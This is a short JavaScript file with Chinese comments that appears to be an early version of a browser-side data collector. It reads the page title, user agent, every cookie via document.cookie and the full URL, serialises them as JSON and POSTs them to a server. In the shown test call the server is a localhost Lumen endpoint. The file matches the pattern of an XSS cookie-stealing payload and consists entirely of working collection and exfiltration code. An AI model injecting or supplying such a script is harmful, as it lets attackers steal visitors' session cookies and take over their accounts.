// v1.0  
// 抓取标题
// 抓取 userAgent
// TODO 分析客户端环境(系统, 浏览器环境)
// 抓取cookie值
// 抓取URL地址信息
// 源生ajax请求


// 抓取标题
function getTitle() {
    var titleObj = document.getElementsByTagName('title')[0];
    return titleObj.innerHTML;
}

// 抓取userAgent
function getUserAgent() {
    return navigator.userAgent;
}

// TODO 通过userAgent 分析数据, 获得当前系统环境, 浏览器环境 
function parseUserAgent() {}


// 获取cookie
function getCookie() {
    return document.cookie;
}

// 获取页面URL信息
function getURL() {
    var url = new Object;
    url.href = window.location.href;
    url.protocol = window.location.protocol;
    url.host  = window.location.host;
    url.port  = window.location.port === "" ? 80 :  window.location.port;
    url.pathname  = window.location.pathname;
    url.search  = window.location.search;
    url.hash  = window.location.hash;
    return url;
}

// ajax
function ajax(type, url, data, success, failed){
    // 创建ajax对象
    var xhr = null;
    if(window.XMLHttpRequest){
        xhr = new XMLHttpRequest();
    } else {
        xhr = new ActiveXObject('Microsoft.XMLHTTP')
    }
 
    var type = type.toUpperCase();
    // 用于清除缓存
    var random = Math.random();
 
    if(typeof data == 'object'){
        var str = '';
        for(var key in data){
            str += key+'='+data[key]+'&';
        }
        data = str.replace(/&$/, '');
    }
 
    if(type == 'GET'){
        if(data){
            xhr.open('GET', url + '?' + data, true);
        } else {
            xhr.open('GET', url + '?t=' + random, true);
        }
        xhr.send();
 
    } else if(type == 'POST'){
        xhr.open('POST', url, true);
        // 如果需要像 html 表单那样 POST 数据，请使用 setRequestHeader() 来添加 http 头。
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.send(data);
    }
 
    // 处理返回数据
    xhr.onreadystatechange = function(){
        if(xhr.readyState == 4){
            if(xhr.status == 200){
                success(xhr.responseText);
            } else {
                if(failed){
                    failed(xhr.status);
                }
            }
        }
    }
}
 


// 汇总收集到的数据, 组合成json
function getCollectData() {
    var data = new Object;
    data.title = getTitle();
    data.userAgent = getUserAgent();
    data.cookie = getCookie();
    data.url = getURL();
    jsonData = JSON.stringify(data);
    // console.log(jsonData);return;
    return jsonData;
}


// 测试请求
var sendData = getCollectData();
ajax('post', 'http://localhost/kaen/studyLumen/public/add', 
    {"data": sendData},
    function(data){
        console.log(data);
    }, function(error){
        console.log(error);
});




